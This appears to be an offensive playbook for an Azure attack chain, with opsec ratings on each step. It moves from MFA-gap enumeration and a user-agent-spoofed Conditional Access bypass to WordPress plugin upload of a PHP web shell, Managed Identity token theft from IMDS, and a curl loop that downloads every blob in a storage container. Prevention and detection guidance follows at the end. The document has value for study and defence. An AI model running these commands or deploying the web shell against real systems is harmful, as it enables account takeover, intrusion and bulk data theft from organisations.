# Azure: MFA Gap → CA Bypass → Blob Storage Exfil

**Severity:** High  
**Entry Point:** MFA Gap enumeration with valid UPN + password  
**Target:** Azure subscription with Conditional Access MFA gaps and accessible WordPress admin or web shell  
**Outcome:** Blob storage data exfiltration via exploited Managed Identity

---

## Chain: MFA Gap Audit → CA Bypass → ARM Token → RCE → Storage Exfil

### [1] MFA Gap Enumeration & Conditional Access Analysis
**Input:** Valid UPN + password; findmeaccess.py tool available  
**Technique:** Scan target Azure tenant for Conditional Access policies that:
- Exclude certain user roles (e.g., Guest, Service Principal accounts)
- Do not enforce MFA on all legacy auth endpoints (basic auth)
- Have user-agent or location-based gaps
**Output:** Identified CA policy loopholes; target user/app combination that bypasses MFA  
**Opsec:** Low (enumeration is noisy but not typically alerted; read-only API calls)

---

### [2] Conditional Access Bypass via User-Agent Spoofing
**Input:** Identified MFA gap; valid UPN + password  
**Technique:** Use `findmeaccess.py` with spoofed User-Agent to request OAuth token:
```bash
python3 findmeaccess.py --username "user@tenant.onmicrosoft.com" --password "P@ssw0rd" \
  --useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  --endpoint "https://management.azure.com"
```
- The spoofed UA bypasses CA policy that checks for "legacy auth" clients
- MFA challenge is skipped because the policy exempts the UA pattern
**Output:** ARM management token (valid JWT) without MFA completion  
**Opsec:** Med (token request is logged; unusual UA may trigger alerts if monitored)

---

### [3] ARM Resource Access & WordPress Detection
**Input:** Valid ARM token; Azure subscription context  
**Technique:**
```bash
az account set --subscription "<subscription-id>"
az resource list --query "[?type=='Microsoft.Web/sites']" -o table
```
- Enumerate web apps (App Services) in the subscription
- Identify WordPress sites or web applications with publicly accessible admin panels
**Output:** Target WordPress site URL + admin portal path (e.g., `/wp-admin`)  
**Opsec:** Low (resource enumeration is standard)

---

### [4] WordPress Admin RCE via Plugin Upload
**Input:** WordPress admin portal URL; administrator credentials OR plugin upload RCE vulnerability  
**Technique:**
- If credentials in environment or Automation variables: login to `/wp-admin` and upload malicious plugin
- If no creds: exploit plugin upload RCE (WordPress/WooCommerce plugin vulns)
- Plugin executes code as web server user (e.g., `www-data`)

**Payload Example:**
```php
<?php
system($_GET['cmd']);
?>
```

Uploaded as `shell.php` in plugin directory → accessible at `/wp-content/plugins/shell.php?cmd=whoami`  
**Output:** Remote code execution as web server user on the App Service instance  
**Opsec:** Med-High (file upload + execution is logged; IDS may detect PHP execution)

---

### [5] Managed Identity Token Theft via IMDS
**Input:** RCE shell on App Service instance  
**Technique:** Steal the Managed Identity token from the Azure Instance Metadata Service (IMDS):
```bash
curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-12-01&resource=https%3A%2F%2Fstorage.azure.com" | jq .access_token -r > storage_token.txt
```
- IMDS is accessible from within the App Service container
- Returns a bearer token for the Managed Identity assigned to that App Service
- Token has `Microsoft.Storage/storageAccounts/blobServices/containers/blobs/read` and `write` permissions
**Output:** Azure Storage Data-Plane token (valid JWT) for blob read-write access  
**Opsec:** Low (IMDS access is normal for Azure workloads; token request not alerted)

---

### [6] Storage Account Enumeration & Blob Exfiltration
**Input:** Valid Storage token; Managed Identity client_id (user-assigned)  
**Technique:**
```bash
export STORAGE_TOKEN=$(cat storage_token.txt)
curl -s -H "Authorization: Bearer $STORAGE_TOKEN" \
  "https://<storage_account>.blob.core.windows.net/<container>?restype=container&comp=list" | \
  grep -oP 'Name>\K[^<]+' > blob_list.txt

# Download all blobs
while read blob; do
  curl -s -H "Authorization: Bearer $STORAGE_TOKEN" \
    "https://<storage_account>.blob.core.windows.net/<container>/$blob" \
    -o "exfil_$blob"
done < blob_list.txt
```
- Enumerate all blobs in accessible containers
- Download full blob contents (configs, secrets, PII, databases)
**Output:** Complete exfiltration of blob storage contents  
**Opsec:** High (high volume data transfer; likely to trigger Data Exfil DLP rules and storage access alerts)

---

## Attack Flow Summary

```
[Initial Access]
    ↓
Valid UPN + Password (from spray, leak, or internal discovery)
    ↓
[1] MFA Gap Audit (Conditional Access analysis)
    ↓ CA loophole identified
[2] CA Bypass via User-Agent Spoof (findmeaccess.py)
    ↓ ARM token obtained (no MFA)
[3] Enumerate Web Apps → WordPress site discovered
    ↓ Admin portal identified
[4] WordPress Plugin Upload RCE
    ↓ Shell as www-data on App Service
[5] Managed Identity Token Theft (IMDS)
    ↓ Storage Data-Plane token obtained
[6] List & Download All Blobs
    ↓
[BLOB STORAGE EXFILTRATED]
```

---

## Mitigation & Detection

### Prevention
1. **Enforce MFA on all endpoints:** Conditional Access policy MUST cover all auth methods (modern + legacy)
2. **Remove user-agent exceptions:** Do not exclude desktop/mobile clients from MFA; UA spoofing is trivial
3. **Disable plugin upload in WordPress:** Restrict admin portal access via WAF; use managed WordPress (App Service WordPress template with locked plugin upload)
4. **Managed Identity scoping:** Assign minimal storage RBAC to Managed Identities; do NOT use Storage Blob Data Contributor on production containers
5. **Network isolation:** Place App Service in App Service Environment (ASE) with private IMDS access controls
6. **Rotate storage keys regularly:** If legacy storage key access detected, rotate immediately

### Detection
1. **Azure AD Sign-In Logs:** Sign-in with unusual user-agent pattern or from suspicious IP + no MFA completion
2. **Azure Activity Log:** `List Storage Account Keys`, `Get Storage Account`, high volume blob read operations from App Service
3. **Storage Account diagnostics:** Unusual auth method (token vs. shared key); high rate of 401/403 errors followed by 200s (auth enumeration then access)
4. **App Service logs:** PHP execution in `/wp-content/plugins/`, plugin directory writes, shell command execution
5. **Blob Storage audit:** Bulk blob enumeration (`$web` container or private containers), unexpected data exfil volume

---

## References
- Technique: [MFA Gap Enumeration & CA Bypass via User-Agent Spoofing](../Cloud/Azure_Attacks.md)
- Technique: [WordPress Admin Plugin Upload RCE](../Web/API_WebShell.md)
- Technique: [Managed Identity Token Theft via IMDS](../Cloud/Azure_Attacks.md)
- Tool: [findmeaccess.py](https://github.com/dafthack/findmeaccess) — CA policy evaluation and bypass
